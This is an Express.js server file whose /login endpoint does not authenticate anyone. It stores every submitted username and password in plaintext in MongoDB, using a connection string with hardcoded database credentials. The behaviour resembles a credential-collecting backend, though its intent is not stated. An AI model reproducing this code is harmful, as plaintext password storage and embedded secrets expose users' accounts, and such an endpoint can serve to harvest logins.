// server.js

const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors'); 
// Initialize Express app
const app = express();
const port = 3000;
app.use(cors());
// Connect to MongoDB
mongoose.connect('mongodb+srv://poojarydeepak15:yashmith@cluster0.0rohejj.mongodb.net/?retryWrites=true&w=majority', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));

// Define a schema for the login data
const loginSchema = new mongoose.Schema({
  username: String,
  password: String
});
const Login = mongoose.model('Login1', loginSchema);

// Middleware to parse request bodies
app.use(bodyParser.json());
app.use(cors());
// Endpoint to handle login requests
app.post('/login', async (req, res) => {
  try {
    // Extract username and password from request body
    const { username, password } = req.body;

    // Save login data to MongoDB
    const login = new Login({ username, password });
    await login.save();

    res.status(200).send('Login data saved successfully');
  } catch (error) {
    console.error('Error saving login data:', error);
    res.status(500).send('Error saving login data');
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
